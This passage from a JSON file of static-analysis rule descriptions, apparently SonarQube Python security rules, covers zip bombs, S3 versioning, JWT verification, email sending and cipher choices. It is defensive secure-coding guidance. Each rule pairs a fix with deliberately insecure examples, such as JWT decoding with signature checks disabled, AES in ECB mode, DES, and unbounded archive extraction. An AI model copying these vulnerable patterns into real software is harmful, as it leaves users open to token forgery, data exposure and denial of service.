href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/489\">CWE-489 - Active Debug Code</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/215\">CWE-215 - Information Exposure Through Debug Information</a> </li>\n</ul>",
        "severity": "MINOR"
      },
      "python:S5042": {
        "name": "Expanding archive files without controlling resource consumption is security-sensitive",
        "htmlDesc": "<p>Successful Zip Bomb attacks occur when an application expands untrusted archive files without controlling the size of the expanded data, which can\nlead to denial of service. A Zip bomb is usually a malicious archive file of a few kilobytes of compressed data but turned into gigabytes of\nuncompressed data. To achieve this extreme <a href=\"https://en.wikipedia.org/wiki/Data_compression_ratio\">compression ratio</a>, attackers will\ncompress irrelevant data (eg: a long string of repeated bytes).</p>\n<h2>Ask Yourself Whether</h2>\n<p>Archives to expand are untrusted and:</p>\n<ul>\n  <li> There is no validation of the number of entries in the archive. </li>\n  <li> There is no validation of the total size of the uncompressed data. </li>\n  <li> There is no validation of the ratio between the compressed and uncompressed archive entry. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Define and control the ratio between compressed and uncompressed data, in general the data compression ratio for most of the legit archives is\n  1 to 3. </li>\n  <li> Define and control the threshold for maximum total size of the uncompressed data. </li>\n  <li> Count the number of file entries extracted from the archive and abort the extraction if their number is greater than a predefined threshold, in\n  particular it’s not recommended to recursively expand archives (an entry of an archive could be also an archive). </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p>For <a href=\"https://docs.python.org/3.5/library/tarfile.html\">tarfile</a> module:</p>\n<pre>\nimport tarfile\n\ntfile = tarfile.open(\"TarBomb.tar\")\ntfile.extractall('./tmp/')  # Sensitive\ntfile.close()\n</pre>\n<p>For <a href=\"https://docs.python.org/dev/library/zipfile.html\">zipfile</a> module:</p>\n<pre>\nimport zipfile\n\nzfile = zipfile.ZipFile('ZipBomb.zip', 'r')\nzfile.extractall('./tmp/') # Sensitive\nzfile.close()\n</pre>\n<h2>Compliant Solution</h2>\n<p>For <a href=\"https://docs.python.org/3.5/library/tarfile.html\">tarfile</a> module:</p>\n<pre>\nimport tarfile\n\nTHRESHOLD_ENTRIES = 10000\nTHRESHOLD_SIZE = 1000000000\nTHRESHOLD_RATIO = 10\n\ntotalSizeArchive = 0;\ntotalEntryArchive = 0;\n\ntfile = tarfile.open(\"TarBomb.tar\")\nfor entry in tfile:\n  tarinfo = tfile.extractfile(entry)\n\n  totalEntryArchive += 1\n  sizeEntry = 0\n  result = b''\n  while True:\n    sizeEntry += 1024\n    totalSizeArchive += 1024\n\n    ratio = sizeEntry / entry.size\n    if ratio &gt; THRESHOLD_RATIO:\n      # ratio between compressed and uncompressed data is highly suspicious, looks like a Zip Bomb Attack\n      break\n\n    chunk = tarinfo.read(1024)\n    if not chunk:\n      break\n\n    result += chunk\n\n  if totalEntryArchive &gt; THRESHOLD_ENTRIES:\n    # too much entries in this archive, can lead to inodes exhaustion of the system\n    break\n\n  if totalSizeArchive &gt; THRESHOLD_SIZE:\n    # the uncompressed data size is too much for the application resource capacity\n    break\n\ntfile.close()\n</pre>\n<p>For <a href=\"https://docs.python.org/dev/library/zipfile.html\">zipfile</a> module:</p>\n<pre>\nimport zipfile\n\nTHRESHOLD_ENTRIES = 10000\nTHRESHOLD_SIZE = 1000000000\nTHRESHOLD_RATIO = 10\n\ntotalSizeArchive = 0;\ntotalEntryArchive = 0;\n\nzfile = zipfile.ZipFile('ZipBomb.zip', 'r')\nfor zinfo in zfile.infolist():\n    print('File', zinfo.filename)\n    data = zfile.read(zinfo)\n\n    totalEntryArchive += 1\n\n    totalSizeArchive = totalSizeArchive + len(data)\n    ratio = len(data) / zinfo.compress_size\n    if ratio &gt; THRESHOLD_RATIO:\n      # ratio between compressed and uncompressed data is highly suspicious, looks like a Zip Bomb Attack\n      break\n\n    if totalSizeArchive &gt; THRESHOLD_SIZE:\n      # the uncompressed data size is too much for the application resource capacity\n      break\n\n    if totalEntryArchive &gt; THRESHOLD_ENTRIES:\n      # too much entries in this archive, can lead to inodes exhaustion of the system\n      break\n\nzfile.close()\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\">Top 10 2017 Category A5 - Broken Access Control</a>\n  </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/409\">CWE-409 - Improper Handling of Highly Compressed Data (Data Amplification)</a> </li>\n  <li> <a href=\"https://www.bamsoftware.com/hacks/zipbomb/\">bamsoftware.com</a> - A better Zip Bomb </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "python:S6252": {
        "name": "Disabling versioning of S3 buckets is security-sensitive",
        "htmlDesc": "<p>S3 buckets can be versioned. When the S3 bucket is unversioned it means that a new version of an object overwrites an existing one in the S3\nbucket.</p>\n<p>It can lead to unintentional or intentional information loss.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The bucket stores information that require high availability. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It’s recommended to enable S3 versioning and thus to have the possibility to retrieve and restore different versions of an object.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nbucket = s3.Bucket(self, \"bucket\",\n    versioned=False       # Sensitive\n)\n</pre>\n<p>The default value of <code>versioned</code> is <code>False</code> so the absence of this parameter is also sensitive.</p>\n<h2>Compliant Solution</h2>\n<pre>\nbucket = s3.Bucket(self, \"bucket\",\n    versioned=True\n)\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/AmazonS3/latest/userguide/Versioning.html\">AWS documentation</a> - Using versioning in S3 buckets </li>\n  <li> <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_s3.Bucket.html#versioned\">AWS CDK version 2</a> - Using versioning in S3\n  buckets </li>\n</ul>",
        "severity": "MINOR"
      },
      "python:S5659": {
        "name": "JWT should be signed and verified",
        "htmlDesc": "<p>This vulnerability allows forging of JSON Web Tokens to impersonate other users.</p>\n<h2>Why is this an issue?</h2>\n<p>JSON Web Tokens (JWTs), a popular method of securely transmitting information between parties as a JSON object, can become a significant security\nrisk when they are not properly signed with a robust cipher algorithm, left unsigned altogether, or if the signature is not verified. This\nvulnerability class allows malicious actors to craft fraudulent tokens, effectively impersonating user identities. In essence, the integrity of a JWT\nhinges on the strength and presence of its signature.</p>\n<h3>What is the potential impact?</h3>\n<p>When a JSON Web Token is not appropriately signed with a strong cipher algorithm or if the signature is not verified, it becomes a significant\nthreat to data security and the privacy of user identities.</p>\n<h4>Impersonation of users</h4>\n<p>JWTs are commonly used to represent user authorization claims. They contain information about the user’s identity, user roles, and access rights.\nWhen these tokens are not securely signed, it allows an attacker to forge them. In essence, a weak or missing signature gives an attacker the power to\ncraft a token that could impersonate any user. For instance, they could create a token for an administrator account, gaining access to high-level\npermissions and sensitive data.</p>\n<h4>Unauthorized data access</h4>\n<p>When a JWT is not securely signed, it can be tampered with by an attacker, and the integrity of the data it carries cannot be trusted. An attacker\ncan manipulate the content of the token and grant themselves permissions they should not have, leading to unauthorized data access.</p>\n<h2>How to fix it in PyJWT</h2>\n<h3>Code examples</h3>\n<p>The following code contains an example of JWT decoding without verification of the signature.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nimport jwt\n\njwt.decode(token, options={\"verify_signature\":False}) # Noncompliant\n</pre>\n<h4>Compliant solution</h4>\n<p>By default, verification is enabled for the method <code>decode</code>.</p>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nimport jwt\n\njwt.decode(token, key, algorithms=\"HS256\")\n</pre>\n<h3>How does this work?</h3>\n<h4>Verify the signature of your tokens</h4>\n<p>Resolving a vulnerability concerning the validation of JWT token signatures is mainly about incorporating a critical step into your process:\nvalidating the signature every time a token is decoded. Just having a signed token using a secure algorithm is not enough. If you are not validating\nsignatures, they are not serving their purpose.</p>\n<p>Every time your application receives a JWT, it needs to decode the token to extract the information contained within. It is during this decoding\nprocess that the signature of the JWT should also be checked.</p>\n<p>To resolve the issue, follow these instructions:</p>\n<ol>\n  <li> Use framework-specific functions for signature verification: Most programming frameworks that support JWTs provide specific functions to not\n  only decode a token but also validate its signature simultaneously. Make sure to use these functions when handling incoming tokens. </li>\n  <li> Handle invalid signatures appropriately: If a JWT’s signature does not validate correctly, it means the token is not trustworthy, indicating\n  potential tampering. The action to take when encountering an invalid token should be denying the request carrying it and logging the event for\n  further investigation. </li>\n  <li> Incorporate signature validation in your tests: When you are writing tests for your application, include tests that check the signature\n  validation functionality. This can help you catch any instances where signature verification might be unintentionally skipped or bypassed. </li>\n</ol>\n<p>By following these practices, you can ensure the security of your application’s JWT handling process, making it resistant to attacks that rely on\ntampering with tokens. Validation of the signature needs to be an integral and non-negotiable part of your token handling process.</p>\n<h3>Going the extra mile</h3>\n<h4>Securely store your secret keys</h4>\n<p>Ensure that your secret keys are stored securely. They should not be hard-coded into your application code or checked into your version control\nsystem. Instead, consider using environment variables, secure key management systems, or vault services.</p>\n<h4>Rotate your secret keys</h4>\n<p>Even with the strongest cipher algorithms, there is a risk that your secret keys may be compromised. Therefore, it is a good practice to\nperiodically rotate your secret keys. By doing so, you limit the amount of time that an attacker can misuse a stolen key. When you rotate keys, be\nsure to allow a grace period where tokens signed with the old key are still accepted to prevent service disruptions.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/347\">CWE-347 - Improper Verification of Cryptographic Signature</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "python:S5300": {
        "name": "Sending emails is security-sensitive",
        "htmlDesc": "<p>This rule is deprecated, and will eventually be removed.</p>\n<p>Sending emails is security-sensitive and can expose an application to a large range of vulnerabilities.</p>\n<p><strong>Information Exposure</strong></p>\n<p>Emails often contain sensitive information which might be exposed to an attacker if he can add an arbitrary address to the recipient list.</p>\n<p><strong>Spamming / Phishing</strong></p>\n<p>Malicious user can abuse email based feature to send spam or phishing content.</p>\n<p><strong>Dangerous Content Injection</strong></p>\n<p>Emails can contain HTML and JavaScript code, thus they can be used for XSS attacks.</p>\n<p><strong>Email Headers Injection</strong></p>\n<p>Email fields such as <code>subject</code>, <code>to</code>, <code>cc</code>, <code>bcc</code>, <code>from</code> are set in email \"headers\".&nbsp;\nUsing unvalidated user input to set those fields&nbsp;might allow attackers to inject new line characters in headers to craft malformed SMTP requests.\nAlthough modern libraries are filtering new line character by default, user data used in&nbsp;email \"headers\" should always be validated.</p>\n<p>In the past, it has led to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9801\">CVE-2017-9801</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-4803\">CVE-2016-4803</a> </li>\n</ul>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Unvalidated user input are used to set email headers. </li>\n  <li> Email content contains data provided by users and it is not sanitized. </li>\n  <li> Email recipient list or body are based on user inputs. </li>\n</ul>\n<p>You are at risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Use an email library which sanitizes headers (Flask-Mail or django.core.mail). </li>\n  <li> Use html escape functions to sanitize every piece of data used to in the email body. </li>\n  <li> Verify application logic to make sure that email base feature can not be abuse to:\n    <ul>\n      <li> Send arbitrary email for spamming or fishing </li>\n      <li> Disclose sensitive email content </li>\n    </ul>  </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p>smtplib</p>\n<pre>\nimport smtplib\n\ndef send(from_email, to_email, msg):\n  server = smtplib.SMTP('localhost', 1025)\n  server.sendmail(from_email, to_email, msg) # Sensitive\n</pre>\n<p>Django</p>\n<pre>\nfrom django.core.mail import send_mail\n\ndef send(subject, msg, from_email, to_email):\n  send_mail(subject, msg, from_email, [to_email]) # Sensitive\n</pre>\n<p>Flask-Mail</p>\n<pre>\nfrom flask import Flask\nfrom flask_mail import Mail, Message\n\napp = Flask(__name__)\n\ndef send(subject, msg, from_email, to_email):\n    mail = Mail(app)\n    msg = Message(subject, [to_email], body, sender=from_email)\n    mail.send(msg) # Sensitive{code}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.damonkohler.com/2008/12/email-injection.html\">Email Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/93\">CWE-93 - Improper Neutralization of CRLF Sequences ('CRLF Injection')</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/80\">CWE-80 - Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic\n  XSS)</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "python:S5542": {
        "name": "Encryption algorithms should be used with secure mode and padding scheme",
        "htmlDesc": "<p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>\n<h2>Why is this an issue?</h2>\n<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used\nfor several important reasons:</p>\n<ul>\n  <li> Confidentiality, privacy, and intellectual property protection </li>\n  <li> Security during transmission or on storage devices </li>\n  <li> Data integrity, general trust, and authentication </li>\n</ul>\n<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>\n<ol>\n  <li> No encryption is unbreakable. </li>\n  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>\n</ol>\n<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and\nsecure by the cryptography community.</p>\n<p>For AES, the weakest mode is ECB (Electronic Codebook). Repeated blocks of data are encrypted to the same value, making them easy to identify and\nreducing the difficulty of recovering the original cleartext.</p>\n<p>Unauthenticated modes such as CBC (Cipher Block Chaining) may be used but are prone to attacks that manipulate the ciphertext. They must be used\nwith caution.</p>\n<p>For RSA, the weakest algorithms are either using it without padding or using the PKCS1v1.5 padding scheme.</p>\n<h3>What is the potential impact?</h3>\n<p>The cleartext of an encrypted message might be recoverable. Additionally, it might be possible to modify the cleartext of an encrypted message.</p>\n<p>Below are some real-world scenarios that illustrate possible impacts of an attacker exploiting the vulnerability.</p>\n<h4>Theft of sensitive data</h4>\n<p>The encrypted message might contain data that is considered sensitive and should not be known to third parties.</p>\n<p>By using a weak algorithm the likelihood that an attacker might be able to recover the cleartext drastically increases.</p>\n<h4>Additional attack surface</h4>\n<p>By modifying the cleartext of the encrypted message it might be possible for an attacker to trigger other vulnerabilities in the code. Encrypted\nvalues are often considered trusted, since under normal circumstances it would not be possible for a third party to modify them.</p>\n<h2>How to fix it in PyCrypto</h2>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<p>Example with a symmetric cipher, AES:</p>\n<pre data-diff-id=\"11\" data-diff-type=\"noncompliant\">\nfrom Crypto.Cipher import AES\n\nAES.new(key, AES.MODE_ECB) # Noncompliant\n</pre>\n<p>Example with an asymmetric cipher, RSA:</p>\n<pre data-diff-id=\"12\" data-diff-type=\"noncompliant\">\nfrom Crypto.Cipher import PKCS1_v1_5\n\nPKCS1_v1_5.new(key) # Noncompliant\n</pre>\n<h4>Compliant solution</h4>\n<p>Since PyCrypto is not supported anymore, another library should be used. In the current context, Cryptodome uses a similar API.</p>\n<p>For the AES symmetric cipher, use the GCM mode:</p>\n<pre data-diff-id=\"11\" data-diff-type=\"compliant\">\nfrom Crypto.Cipher import AES\n\nAES.new(key, AES.MODE_GCM)\n</pre>\n<p>For the RSA asymmetric cipher, use the Optimal Asymmetric Encryption Padding (OAEP):</p>\n<pre data-diff-id=\"12\" data-diff-type=\"compliant\">\nfrom Crypto.Cipher import PKCS1_OAEP\n\nPKCS1_OAEP.new(key)\n</pre>\n<h3>How does this work?</h3>\n<p>As a rule of thumb, use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic community.</p>\n<p>Appropriate choices are currently the following.</p>\n<h4>For AES: use authenticated encryption modes</h4>\n<p>The best-known authenticated encryption mode for AES is Galois/Counter mode (GCM).</p>\n<p>GCM mode combines encryption with authentication and integrity checks using a cryptographic hash function and provides both confidentiality and\nauthenticity of data.</p>\n<p>Other similar modes are:</p>\n<ul>\n  <li> CCM: <code>Counter with CBC-MAC</code> </li>\n  <li> CWC: <code>Cipher Block Chaining with Message Authentication Code</code> </li>\n  <li> EAX: <code>Encrypt-and-Authenticate</code> </li>\n  <li> IAPM: <code>Integer Authenticated Parallelizable Mode</code> </li>\n  <li> OCB: <code>Offset Codebook Mode</code> </li>\n</ul>\n<p>It is also possible to use AES-CBC with HMAC for integrity checks. However, it is considered more straightforward to use AES-GCM directly\ninstead.</p>\n<h4>For RSA: use the OAEP scheme</h4>\n<p>The Optimal Asymmetric Encryption Padding scheme (OAEP) adds randomness and a secure hash function that strengthens the regular inner workings of\nRSA.</p>\n<h2>Resources</h2>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://learn.microsoft.com/en-us/dotnet/standard/security/vulnerabilities-cbc-mode\">Microsoft, Timing vulnerabilities with CBC-mode\n  symmetric decryption using padding</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Padding_oracle_attack\">Wikipedia, Padding Oracle Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Chosen-ciphertext_attack\">Wikipedia, Chosen-Ciphertext Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Chosen-plaintext_attack\">Wikipedia, Chosen-Plaintext Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Semantic_security\">Wikipedia, Semantically Secure Cryptosystems</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding\">Wikipedia, OAEP</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Galois/Counter_Mode\">Wikipedia, Galois/Counter Mode</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/327\">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "python:S5547": {
        "name": "Cipher algorithms should be robust",
        "htmlDesc": "<p>This vulnerability makes it possible that the cleartext of the encrypted message might be recoverable without prior knowledge of the key.</p>\n<h2>Why is this an issue?</h2>\n<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communication in various domains. They are used for\nseveral important reasons:</p>\n<ul>\n  <li> Confidentiality, privacy, and intellectual property protection </li>\n  <li> Security during transmission or on storage devices </li>\n  <li> Data integrity, general trust, and authentication </li>\n</ul>\n<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>\n<ol>\n  <li> No encryption is unbreakable. </li>\n  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>\n</ol>\n<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and\nsecure by the cryptography community.</p>\n<h3>What is the potential impact?</h3>\n<p>The cleartext of an encrypted message might be recoverable. Additionally, it might be possible to modify the cleartext of an encrypted message.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Theft of sensitive data</h4>\n<p>The encrypted message might contain data that is considered sensitive and should not be known to third parties.</p>\n<p>By using a weak algorithm the likelihood that an attacker might be able to recover the cleartext drastically increases.</p>\n<h4>Additional attack surface</h4>\n<p>By modifying the cleartext of the encrypted message it might be possible for an attacker to trigger other vulnerabilities in the code. Encrypted\nvalues are often considered trusted, since under normal circumstances it would not be possible for a third party to modify them.</p>\n<h2>How to fix it in Cryptodome</h2>\n<h3>Code examples</h3>\n<p>The following code contains examples of algorithms that are not considered highly resistant to cryptanalysis and thus should be avoided.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nfrom Crypto.Cipher import DES # pycryptodome\nfrom Cryptodome.Cipher import DES # pycryptodomex\n\ncipher = DES.new(key, DES.MODE_OFB) # Noncompliant\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nfrom Crypto.Cipher import AES # pycryptodome\nfrom Cryptodome.Cipher import AES # pycryptodomex\n\ncipher = AES.new(key, AES.MODE_CCM)\n</pre>\n<h3>How does this work?</h3>\n<h4>Use a secure algorithm</h4>\n<p>It is highly recommended to use an algorithm that is currently considered secure by the cryptographic community. A common choice for such an\nalgorithm is the Advanced Encryption Standard (AES).</p>\n<p>For block ciphers, it is not recommended to use algorithms with a block size that is smaller than 128 bits.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/327\">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "python:S4787": {
        "name": "Encrypting data is security-sensitive",
        "htmlDesc": "<p>This rule is deprecated; use <a href='/coding_rules#rule_key=python%3AS4426'>S4426</a>, <a href='/coding_rules#rule_key=python%3AS5542'>S5542</a>, <a href='/coding_rules#rule_key=python%3AS5547'>S5547</a> instead.</p>\n<p>Encrypting data is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7902\">CVE-2017-7902</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-1378\">CVE-2006-1378</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1376\">CVE-2003-1376</a> </li>\n</ul>\n<p>Proper encryption requires both the encryption algorithm and the key to be strong. Obviously the private key needs to remain secret and be renewed\nregularly. However these are not the only means to defeat or weaken an encryption.</p>\n<p>This rule flags function calls that initiate encryption/decryption.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> the private key might not be random, strong enough or the same key is reused for a long long time. </li>\n  <li> the private key might be compromised. It can happen when it is stored in an unsafe place or when it was transferred in an unsafe manner. </li>\n  <li> the key exchange is made without properly authenticating the receiver. </li>\n  <li> the encryption algorithm is not strong enough for the level of protection required. Note that encryption algorithms strength decreases as time\n  passes. </li>\n  <li> the chosen encryption library is deemed unsafe. </li>\n  <li> a nonce is used, and the same value is reused multiple times, or the nonce is not random. </li>\n  <li> the RSA algorithm is used, and it does not incorporate an Optimal Asymmetric Encryption Padding (OAEP), which might weaken the encryption.\n  </li>\n  <li> the CBC (Cypher Block Chaining) algorithm is used for encryption, and it’s IV (Initialization Vector) is not generated using a secure random\n  algorithm, or it is reused. </li>\n  <li> the Advanced Encryption Standard (AES) encryption algorithm is used with an unsecure mode. See the recommended practices for more information.\n  </li>\n</ul>\n<p>You are at risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Generate encryption keys using secure random algorithms. </li>\n  <li> When generating cryptographic keys (or key pairs), it is important to use a key length that provides enough entropy against brute-force\n  attacks. For the Blowfish algorithm the key should be at least 128 bits long, while for the RSA algorithm it should be at least 2048 bits long.\n  </li>\n  <li> Regenerate the keys regularly. </li>\n  <li> Always store the keys in a safe location and transfer them only over safe channels. </li>\n  <li> If there is an exchange of cryptographic keys, check first the identity of the receiver. </li>\n  <li> Only use strong encryption algorithms. Check regularly that the algorithm is still deemed secure. It is also imperative that they are\n  implemented correctly. Use only encryption libraries which are deemed secure. Do not define your own encryption algorithms as they will most\n  probably have flaws. </li>\n  <li> When a nonce is used, generate it randomly every time. </li>\n  <li> When using the RSA algorithm, incorporate an Optimal Asymmetric Encryption Padding (OAEP). </li>\n  <li> When CBC is used for encryption, the IV must be random and unpredictable. Otherwise it exposes the encrypted value to crypto-analysis attacks\n  like \"Chosen-Plaintext Attacks\". Thus a secure random algorithm should be used. An IV value should be associated to one and only one encryption\n  cycle, because the IV’s purpose is to ensure that the same plaintext encrypted twice will yield two different ciphertexts. </li>\n  <li> The Advanced Encryption Standard (AES) encryption algorithm can be used with various modes. Galois/Counter Mode (GCM) with no padding should be\n  preferred to the following combinations which are not secured:\n    <ul>\n      <li> Electronic Codebook (ECB) mode: Under a given key, any given plaintext block always gets encrypted to the same ciphertext block. Thus, it\n      does not hide data patterns well. In some senses, it doesn’t provide serious message confidentiality, and it is not recommended for use in\n      cryptographic protocols at all. </li>\n      <li> Cipher Block Chaining (CBC) with PKCS#5 padding (or PKCS#7) is susceptible to padding oracle attacks. </li>\n    </ul>  </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p><code>cryptography</code> module</p>\n<pre>\nfrom cryptography.fernet import Fernet\nfrom cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305, AESGCM, AESCCM\nfrom cryptography.hazmat.primitives.asymmetric import rsa\nfrom cryptography.hazmat.primitives.ciphers import Cipher\n\n\ndef encrypt(key):\n    Fernet(key)  # Sensitive\n    ChaCha20Poly1305(key)  # Sensitive\n    AESGCM(key)  # Sensitive\n    AESCCM(key)  # Sensitive\n\n\nprivate_key = rsa.generate_private_key()  # Sensitive\n\n\ndef encrypt2(algorithm, mode, backend):\n    Cipher(algorithm, mode, backend)  # Sensitive\n</pre>\n<p><code>pynacl</code> library</p>\n<pre>\nfrom nacl.public import Box\nfrom nacl.secret import SecretBox\n\n\ndef public_encrypt(secret_key, public_key):\n    Box(secret_key, public_key)  # Sensitive\n\n\ndef secret_encrypt(key):\n    SecretBox(key)  # Sensitive\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/321\">CWE-321 - Use of Hard-coded Cryptographic Key</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/322\">CWE-322 - Key Exchange without Entity Authentication</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/323\">CWE-323 - Reusing a Nonce, Key Pair in Encryption</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/324\">CWE-324 - Use of a Key Past its Expiration Date</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/325\">CWE-325 - Missing Required Cryptographic Step</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/326\">CWE-326 - Inadequate Encryption Strength</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/327\">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "python:S4423": {
        "name": "Weak SSL/TLS protocols should not be used",
